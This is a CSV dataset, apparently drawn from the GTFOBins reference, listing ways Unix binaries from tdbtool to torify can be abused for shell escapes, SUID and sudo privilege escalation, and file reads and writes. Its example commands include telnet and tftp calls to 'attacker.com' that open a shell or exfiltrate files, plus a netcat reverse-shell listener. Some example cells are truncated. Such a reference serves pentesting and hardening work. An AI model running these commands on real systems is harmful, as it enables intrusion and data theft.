Binary,Function Name,Function URL,Description,Example
tdbtool,Limited SUID,https://gtfobins.github.io/gtfobins/tdbtool/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
tee,File write,https://gtfobins.github.io/gtfobins/tee/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
echo DATA | ./tee -a ""$LFILE"""
tee,SUID,https://gtfobins.github.io/gtfobins/tee/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
tee,Sudo,https://gtfobins.github.io/gtfobins/tee/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
telnet,Shell,https://gtfobins.github.io/gtfobins/telnet/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"RHOST=attacker.com
RPORT=12345
telnet $RHOST $RPORT
^]
!/bin/sh"
telnet,Reverse shell,https://gtfobins.github.io/gtfobins/telnet/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
telnet,Sudo,https://gtfobins.github.io/gtfobins/telnet/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
telnet,Limited SUID,https://gtfobins.github.io/gtfobins/telnet/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
terraform,File read,https://gtfobins.github.io/gtfobins/terraform/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","terraform console
file(""file_to_read"")"
terraform,SUID,https://gtfobins.github.io/gtfobins/terraform/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
terraform,Sudo,https://gtfobins.github.io/gtfobins/terraform/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
tex,Shell,https://gtfobins.github.io/gtfobins/tex/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,tex --shell-escape '\write18{/bin/sh}\end'
tex,Sudo,https://gtfobins.github.io/gtfobins/tex/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
tex,Limited SUID,https://gtfobins.github.io/gtfobins/tex/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
tftp,File upload,https://gtfobins.github.io/gtfobins/tftp/#file-upload,It can exfiltrate files on the network.,"RHOST=attacker.com
tftp $RHOST
put file_to_send"
tftp,File download,https://gtfobins.github.io/gtfobins/tftp/#file-download,It can download remote files.,"RHOST=attacker.com
tftp $RHOST
get file_to_get"
tftp,SUID,https://gtfobins.github.io/gtfobins/tftp/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
tftp,Sudo,https://gtfobins.github.io/gtfobins/tftp/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
tic,File read,https://gtfobins.github.io/gtfobins/tic/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
tic -C ""$LFILE"""
tic,SUID,https://gtfobins.github.io/gtfobins/tic/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
tic,Sudo,https://gtfobins.github.io/gtfobins/tic/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
time,Shell,https://gtfobins.github.io/gtfobins/time/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,/usr/bin/time /bin/sh
time,SUID,https://gtfobins.github.io/gtfobins/time/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
time,Sudo,https://gtfobins.github.io/gtfobins/time/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
timedatectl,Shell,https://gtfobins.github.io/gtfobins/timedatectl/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"timedatectl list-timezones
!/bin/sh"
timedatectl,Sudo,https://gtfobins.github.io/gtfobins/timedatectl/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
timeout,Shell,https://gtfobins.github.io/gtfobins/timeout/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,timeout 7d /bin/sh
timeout,SUID,https://gtfobins.github.io/gtfobins/timeout/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
timeout,Sudo,https://gtfobins.github.io/gtfobins/timeout/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
tmate,Shell,https://gtfobins.github.io/gtfobins/tmate/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,tmate -c /bin/sh
tmate,Sudo,https://gtfobins.github.io/gtfobins/tmate/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
tmate,Limited SUID,https://gtfobins.github.io/gtfobins/tmate/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
tmux,Shell,https://gtfobins.github.io/gtfobins/tmux/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,tmux
tmux,File read,https://gtfobins.github.io/gtfobins/tmux/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",tmux
tmux,Sudo,https://gtfobins.github.io/gtfobins/tmux/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
top,Shell,https://gtfobins.github.io/gtfobins/top/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
top
# press return twice
reset"
top,Sudo,https://gtfobins.github.io/gtfobins/top/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
torify,Shell,https://gtfobins.github.io/gtfobins/torify/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,torify /bin/sh
torify,Sudo,https://gtfobins.github.io/gtfobins/torify/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
